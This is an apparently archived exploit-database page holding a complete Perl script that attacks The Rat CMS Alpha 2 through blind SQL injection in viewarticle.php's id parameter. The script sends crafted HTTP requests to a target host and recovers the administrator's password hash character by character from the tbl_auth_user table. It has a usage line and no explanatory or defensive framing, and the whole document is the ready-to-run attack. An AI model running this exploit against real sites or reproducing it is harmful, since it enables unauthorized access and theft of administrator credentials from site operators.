<html><head><title>The Rat CMS Alpha 2 (viewarticle.php id) Blind SQL Injection Exploit</title></head><pre>#--+++=============================================================+++--#
#--+++====== The Rat CMS Alpha 2 Blind SQL Injection Exploit ======+++--#
#--+++=============================================================+++--#
#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;


sub query {
	my $chr = shift;
	my $pos = shift;
	my $query = &quot;'x' OR ASCII(SUBSTRING((SELECT user_password FROM tbl_auth_user WHERE user_id = 'theadmin'),${pos},1))=${chr}&quot;;
	$query =~ s/ /%20/g;
	$query =~ s/'/%27/g;
	return $query;
}

sub check {
	my $host = shift;
	my $path = shift;
	my $chr  = ord (shift);
	my $pos  = shift;

	my $sock = new IO::Socket::INET (
		PeerHost =&gt; $host,
		PeerPort =&gt; 80,
		Proto    =&gt; &quot;tcp&quot;,
	);
	
	my $query = query ($chr, $pos);
	print $sock &quot;GET ${path}/viewarticle.php?id=${query} HTTP1.1\r\n\r\n&quot;;
	my $x;
	while (&lt;$sock&gt;)
	{
		$x .= $_;
	}

	$x =~ s/\s/ /g;
	$x =~ /&lt;h1 align=&quot;center&quot;&gt;(.+?)\/h1&gt;/;
	if (length ($1) &gt; 1)
	{
		return 1;
	}
	else
	{
		return 0;
	}

	close ($sock);
}

sub usage {
	print
		&quot;\n[+] The Rat CMS Alpha 2 Blind SQL Injection Exploit&quot;.
		&quot;\n[+] Author:  darkjoker&quot;.
		&quot;\n[+] Site:    http://darkjoker.net23.net&quot;.
		&quot;\n[+] Usage:   perl $0 &lt;hostname&gt; &lt;path&gt;&quot;.
		&quot;\n[+] Greetz:  certaindeath\n&quot;;
	exit ();
}


my $host = shift;
my $path = shift or usage;

my @key = split '', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789*';

my $pos = 1;
my $chr = 0;

while ($pos &lt;= 32)
{
	if (check ($host, $path, $key [$chr], $pos))
	{
		print $key [$chr];
		$chr = -1;
		$pos++;
	}
	$chr++;

}

print &quot;\n&quot;;

# milw0rm.com [2009-01-04]</pre></html>